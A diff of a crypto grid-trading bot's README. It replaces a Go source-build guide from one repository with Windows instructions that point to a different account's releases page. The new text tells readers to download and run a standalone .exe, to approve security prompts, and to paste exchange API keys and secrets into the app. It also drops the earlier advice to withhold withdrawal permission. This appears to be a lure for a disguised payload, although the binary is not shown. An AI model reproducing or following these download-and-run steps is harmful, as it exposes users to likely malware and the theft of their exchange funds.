@@ -1,279 +1,101 @@
-# nexus-trade-bot
+# 🤖 nexus-trade-bot - Automate your crypto trading strategy easily
 
-<p align="center">
-  <img src="logo/logo.png" alt="Nexus Trade Bot" width="720">
-</p>
+[![](https://img.shields.io/badge/Download_Nexus_Trade_Bot-Blue)](https://github.com/3mitra5814/nexus-trade-bot/releases)
 
-**A grid bot control center built for traders who want volume, automation, and risk visibility without babysitting every order. Futures is the default mode; spot grids are supported on major centralized exchanges.**
+Nexus Trade Bot helps you run trading strategies on your computer. It connects to crypto exchanges to place orders and manage your assets. The software handles high-speed trades for you inside a simple web interface. You do not need to write code to use this tool. You can deploy it quickly on your own hardware or a server.
 
-[![Go](https://img.shields.io/badge/Go-1.26%2B-00ADD8?logo=go&logoColor=white)](https://go.dev/)
-[![License](https://img.shields.io/badge/license-GPL--3.0-green)](LICENSE)
-[![One Command](https://img.shields.io/badge/install-one%20command-blue)](#one-command-install)
-[![Languages](https://img.shields.io/badge/languages-11-orange)](#languages)
+## ⚙️ System Requirements
 
-## Community
+To run this software on Windows, ensure your computer meets these minimum standards:
 
-Questions, deployment notes, exchange-specific fixes, and live trading lessons are easier when users are in one place. Community link: [https://t.me/nexustradebot8](https://t.me/nexustradebot8).
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Dual-core CPU with 2.0 GHz speed or higher.
+*   Memory: 4 GB of RAM or more.
+*   Storage: 500 MB of free space.
+*   Internet: A stable connection for consistent trade execution.
 
-## Languages
+You do not need to install complex language environments. The application comes as a standalone file.
 
-English | [简体中文](docs/readme/README.zh-CN.md) | [Русский](docs/readme/README.ru.md) | [한국어](docs/readme/README.ko.md) | [日本語](docs/readme/README.ja.md) | [Español](docs/readme/README.es.md) | [Tiếng Việt](docs/readme/README.vi.md) | [हिन्दी](docs/readme/README.hi.md) | [Português](docs/readme/README.pt.md) | [العربية](docs/readme/README.ar.md) | [繁體中文](docs/readme/README.zh-TW.md)
+## 📥 Downloading the Software
 
-## Read This First
+[![](https://img.shields.io/badge/Click_Here_to_Download-Grey)](https://github.com/3mitra5814/nexus-trade-bot/releases)
 
-If you are a trader, start with the one-command install, open the web console, add an API key with trading permission only, and create a small test bot before using real size.
+Follow these steps to get the software on your machine:
 
-If you are a developer, the useful path is: build from source, inspect `config.example.yaml`, run `go test ./...`, then use worker mode when you want to launch a bot from a specific config file.
+1.  Navigate to the [official release page](https://github.com/3mitra5814/nexus-trade-bot/releases).
+2.  Look for the latest release at the top of the page.
+3.  Find the file that ends in .exe for Windows.
+4.  Click the file name to start the download process.
+5.  Save the file to a folder you can find later, such as your Downloads or Documents folder.
 
-The README is organized from practical use to technical detail: install, supported exchanges, what the bot does, strategy examples, parameters, manual installation, and live-trading checks.
+## 🚀 Setting Up the Application
 
-## One-Command Install
+Once the download finishes, follow this guide to start the software:
 
-Run this on a fresh Ubuntu server:
+1.  Open the folder containing the downloaded file.
+2.  Double-click the .exe file to run the application.
+3.  A window might appear asking for permission to run the software. Click "Run" or "Yes" if you trust the source.
+4.  A black window called a console will open. Do not close this window. It acts as the engine for your trading bot.
+5.  Open your internet browser.
+6.  Type "localhost:8080" into your browser address bar and press Enter. 
+7.  The Nexus Trade Bot dashboard should appear on your screen.
 
-```bash
-wget -O nexus-trade-bot.sh https://raw.githubusercontent.com/haohaoi34/nexus-trade-bot/main/scripts/nexus-trade-bot.sh && chmod +x nexus-trade-bot.sh && ./nexus-trade-bot.sh install && ./nexus-trade-bot.sh start
-```
+## 🔑 Connecting Your Exchange
 
-The server runner automatically:
+The bot needs permission to trade on your behalf. You must link your crypto exchange account.
 
-- Installs missing Ubuntu dependencies.
-- Installs Go if the server does not have a compatible version.
-- Clones `https://github.com/haohaoi34/nexus-trade-bot.git` when it is not already running inside a source checkout.
-- Builds the bot from source, or uses the bundled binary in a release package.
-- Creates `config.yaml` from `config.example.yaml` if needed and keeps it local.
-- Starts the web console in the background and writes logs to `logs/`.
-- Prints a clear access block with the local URL, bind address, PID file, and log paths. Remote access stays off unless you explicitly bind a public address.
+1.  Log into your exchange account, such as Binance, Bybit, or OKX, using a web browser.
+2.  Search for "API Management" in your exchange account settings.
+3.  Create a new API key.
+4.  Copy the API Key and the API Secret. Keep these codes safe. Do not share them with anyone.
+5.  Return to the Nexus Trade Bot dashboard in your browser.
+6.  Find the "Settings" or "Exchange Keys" section.
+7.  Paste your API Key and Secret into the designated fields.
+8.  Select your exchange from the provided list.
+9.  Click "Save" to apply the changes.
 
-Useful server commands:
+The bot will now sync with your exchange data. You can see your balances and current orders on the main dashboard.
 
-```bash
-./nexus-trade-bot.sh install
-./nexus-trade-bot.sh start
-./nexus-trade-bot.sh status
-./nexus-trade-bot.sh logs
-./nexus-trade-bot.sh restart
-./nexus-trade-bot.sh stop
-./nexus-trade-bot.sh update
-```
+## 📈 Configuring Your Trading Strategy
 
-Default web login:
+The software uses grids and market-making strategies. A grid strategy places buy and sell orders at set levels.
 
-```text
-username: admin
-password: admin
-```
+1.  Click the "New Strategy" button on the dashboard.
+2.  Choose the crypto pair you want to trade, such as BTC/USDT.
+3.  Set the upper and lower price limits for your bot.
+4.  Choose the number of grids. A higher number of grids places more orders in a smaller price range.
+5.  Input the amount of capital you want to assign to this specific strategy.
+6.  Review your settings. If everything looks correct, click "Start Bot."
 
-Change the default password immediately after your first login. The bundled server runner binds the web console to `127.0.0.1:8080` by default. For remote access, prefer SSH tunneling or a reverse proxy with firewall rules; only use `NEXUS_TRADE_BOT_ADDR=0.0.0.0:8080` when you intentionally want a public bind.
+## 🛡️ Managing Risk
 
-## Supported Exchanges
+The bot includes tools to protect your funds. Use these settings to limit exposure during high market volatility.
 
-- Binance ☑️
-- Bitget ☑️
-- Gate.io ☑️
-- Bybit ☑️
-- OKX ☑️
-- Hyperliquid ☑️
+*   Stop Loss: This button stops the bot if the asset price falls below a certain point.
+*   Take Profit: This setting closes your position when your target gain is reached.
+*   Max Position Size: Use this to limit the amount of money spent on a single trade.
+*   Risk Controls: The dashboard displays real-time data on how much your open orders impact your account balance.
 
+Check these settings every time you start a new strategy.
 
-## What It Does
+## 🛠️ Troubleshooting Common Issues
 
-nexus-trade-bot helps you run grid strategies from a clean web console:
+If you face trouble, check these common fixes:
 
-- Add exchange APIs once and verify them before use.
-- Create multiple bots for different symbols, accounts, and directions.
-- Choose futures or spot. Futures is selected by default.
-- Use long, short, or neutral mode on futures; use long mode on spot.
-- Load Binance, Bitget, Bybit, OKX, Gate, and Hyperliquid spot symbols automatically.
-- Watch balances, trading volume, bot status, and PnL in real time.
-- Pause a bot, change parameters, and restart it with the latest settings.
-- Let the risk monitor stop trading during abnormal market moves.
+*   The webpage does not load: Ensure the black console window remains open on your taskbar. Check if another program uses port 8080.
+*   API Error: Double-check your API key and secret. Ensure your exchange account has "Enable Spot Trading" or "Enable Futures Trading" permissions selected.
+*   Bot stays idle: Ensure the bot has enough funds in the wallet to create the minimum number of orders required by your grid strategy.
+*   Connection timeout: Check your internet connection. Large network latency can prevent the bot from updating data.
 
-It is designed for traders who care about execution, turnover, and control, not for people who want to keep editing config files all day.
+## 📂 Updating the Software
 
-## The Core Idea
+The developers release updates to improve performance and add features. Follow these steps to update:
 
-A grid bot places buy and sell orders at fixed price intervals. Instead of trying to predict the exact top or bottom, it keeps working around a price range:
+1.  Download the new version from the link provided above.
+2.  Close your current Nexus Trade Bot application.
+3.  Replace the old .exe file with the new one in your folder.
+4.  Restart the application. Your saved settings usually carry over to the new version automatically.
 
-- When price drops, the bot gradually buys according to your grid settings.
-- When price rebounds, the bot sells higher levels step by step.
-- In a sideways or upward-recovering market, this can turn volatility into repeated realized trades.
-- In a one-way downtrend, the bot accumulates position and needs enough margin, risk limits, and patience.
+## 📋 Additional Information
 
-The goal is not magic profit. The goal is disciplined execution: consistent order spacing, controlled order size, visible risk, and automatic reaction when the market becomes abnormal.
-
-
-## Example Strategy: ETH Grid With High Turnover
-
-Here is a practical example to understand how traders use this type of bot.
-
-Assume ETH is trading near `3000`, and you configure:
-
-| Parameter | Example |
-| --- | --- |
-| Symbol | `ETHUSDT` or `ETHUSDC` |
-| Direction | Long grid |
-| Price interval | `1 USDT` |
-| Order amount | `300 USDT` per grid order |
-| Market style | Sideways or upward-recovering market |
-
-With a tight `1 USDT` interval and active ETH liquidity, the bot may generate very high turnover. In a busy market, this kind of configuration can reach millions of dollars in daily trading volume, and tens of millions in monthly volume, depending on volatility, fees, liquidity, and account size.
-
-This is why many traders use grid systems for two purposes:
-
-- **Volume building**: increasing futures trading volume for exchange VIP tiers or campaigns.
-- **Volatility harvesting**: repeatedly buying lower and selling higher inside a range.
-
-
-## Example Drawdown Logic
-
-Grid trading must be planned around drawdown.
-
-Suppose ETH starts near `3000` and falls to `2700`. A long grid will usually hold a floating loss because it has bought along the way down. But it has also accumulated lower entries. If price later rebounds from `2700` toward `2850`, the average cost may be pulled down enough that the account approaches breakeven earlier than a single entry at `3000`.
-
-If ETH returns close to the original `3000` area, the strategy may benefit from both:
-
-- inventory recovery from the rebound;
-- realized grid spreads collected during the movement.
-
-Some traders reserve a larger margin buffer, for example around `30,000 USDT`, to design a grid that can tolerate a much deeper move such as a `1000 USDT` ETH drawdown. Whether that is enough depends on leverage, margin mode, position size, fees, exchange maintenance margin rules, and how aggressive your grid is.
-
-The important point: grid profit comes from preparation, not optimism. Before running size, calculate how far the market can move against you, how much position the bot can accumulate, and what happens if the market does not rebound quickly.
-
-
-## Built-In Risk Protection
-
-Fast one-way drops are the worst environment for an aggressive long grid. nexus-trade-bot includes a market risk monitor designed to reduce this problem:
-
-- watches major symbols such as BTC, ETH, SOL, XRP, and DOGE;
-- detects abnormal price and volume behavior;
-- pauses trading when market conditions become dangerous;
-- allows trading again only after enough monitored symbols recover.
-
-This does not remove risk, but it gives the bot a chance to stop adding exposure during sudden liquidation-style moves.
-
-
-## Common Ways To Use It
-
-### 1. Volume and VIP Tier Building
-
-Use tight intervals and controlled order size on deep-liquidity symbols. The goal is high turnover with predictable execution. Fee rates matter a lot here, so use low-fee pairs or maker-fee discounts where possible.
-
-### 2. Long Grid After a Market Pullback
-
-Start after a meaningful drop instead of chasing a vertical pump. The bot buys in layers and sells into rebounds. This style needs enough margin to survive deeper pullbacks.
-
-### 3. Binance Spot Grid
-
-Use spot mode when you want the bot to buy and sell actual coins instead of opening leveraged futures positions. Spot mode is long-only: the bot buys lower levels first and sells inventory into rebounds. It is simpler than futures, but it still needs enough quote balance and a plan for prolonged downtrends.
-
-### 4. Inventory Exit
-
-If you already hold a position, the bot can help sell it out gradually as price rises. When the position is fully reduced, you can stop the bot.
-
-### 5. Neutral Grid
-
-Use neutral mode when you want both long-side and short-side grid behavior. Start with smaller size and watch how the exchange handles position mode before scaling.
-
-### 6. Classic Grid
-
-Classic grid is a futures-only neutral mode. It keeps 50 live buy orders below the current grid price and 50 live sell orders above it, with no upper or lower range. Filled grids are replenished automatically so the book stays close to 100 active orders. Hyperliquid futures currently does not support this mode because it does not expose the required neutral hedge behavior.
-
-
-## Parameter Guide
-
-| Setting | What It Means | Practical Tip |
-| --- | --- | --- |
-| `symbol` | Trading pair | Start with liquid pairs such as BTC or ETH. |
-| `app.market_type` | `futures` or `spot` | Defaults to `futures`. Spot live trading supports Binance, Bitget, Bybit, OKX, Gate, and Hyperliquid through dedicated adapters. |
-| `mode` | `normal`, `aggressive`, or `classic` | Use `classic` for the fixed 50-buy/50-sell grid. It forces futures + neutral mode and targets 100 live orders total. |
-| `direction` | `long`, `short`, or `neutral` | Long grids need margin for drawdowns. Existing exchange positions are restored as bot inventory at startup. |
-| `price_interval` | Distance between grid levels | Smaller interval means more trades and more fees. |
-| `order_quantity` | Amount used per order | Larger amount increases turnover and drawdown. Confirm whether the UI is showing quote value or base quantity for your exchange and market type. |
-| `min_order_value` | Minimum order notional | Must satisfy exchange minimums. |
-| `risk_control.enabled` | Market abnormality protection | Keep it enabled unless you know exactly why not. |
-
-
-## Web Console
-
-The console supports 11 languages:
-
-English, Simplified Chinese, Russian, Korean, Japanese, Spanish, Vietnamese, Hindi, Portuguese, Arabic, and Traditional Chinese.
-
-Web Console mode shows:
-
-- API management
-- bot creation and editing
-- exchange logos
-- real-time balances
-- today and total realized PnL
-- today and total trading volume
-- running, paused, and stopped bot states
-
-
-## Manual Installation
-
-```bash
-git clone https://github.com/haohaoi34/nexus-trade-bot.git
-cd nexus-trade-bot
-go mod download
-go build -o nexus-trade-bot .
-```
-
-Start Web Console:
-
-```bash
-./nexus-trade-bot
-```
-
-Default local URL:
-
-```text
-http://127.0.0.1:8080
-```
-
-Expose on a server:
-
-```bash
-NEXUS_TRADE_BOT_ADDR=0.0.0.0:8080 ./nexus-trade-bot
-```
-
-Only expose the console intentionally. Keep the port behind a firewall, VPN, SSH tunnel, or reverse proxy with authentication.
-
-One-command server runner from a source checkout:
-
-```bash
-chmod +x scripts/nexus-trade-bot.sh
-scripts/nexus-trade-bot.sh install
-scripts/nexus-trade-bot.sh start
-scripts/nexus-trade-bot.sh status
-scripts/nexus-trade-bot.sh logs
-scripts/nexus-trade-bot.sh stop
-```
-
-The runner works from both a source checkout and a release package. In source mode it builds `./nexus-trade-bot`; in release mode it uses the bundled binary directly.
-
-Run CLI worker mode:
-
-```bash
-./nexus-trade-bot worker config.yaml
-```
-
-
-## Before You Trade Live
-
-Check these first:
-
-- API key has trading permission but no withdrawal permission.
-- Margin mode is what you expect.
-- Leverage is not too aggressive.
-- The symbol has enough liquidity.
-- Order size meets exchange minimums.
-- You understand how much position the grid can accumulate.
-- You have a plan for one-way markets.
-- Your server firewall exposes the web port only when intended.
-
-
-## Disclaimer
-
-Futures trading can cause significant losses. Grid strategies can perform well in range-bound or recovering markets, but they can also accumulate large positions during strong one-way trends. nexus-trade-bot is execution software; you are responsible for strategy settings, exchange configuration, account risk, and every trade placed through your API keys.
+The bot records a log of all actions. If you have questions about a specific trade, look at the logs available in the "Help" or "Support" tab inside the web console. This file shows exact timestamps and the status of every order sent to the exchange. Use this information if you need to report an issue or investigate a mistake. Keep your computer awake while the bot runs. If your computer goes to sleep or loses power, the bot pauses its trading operations until you restart the application.
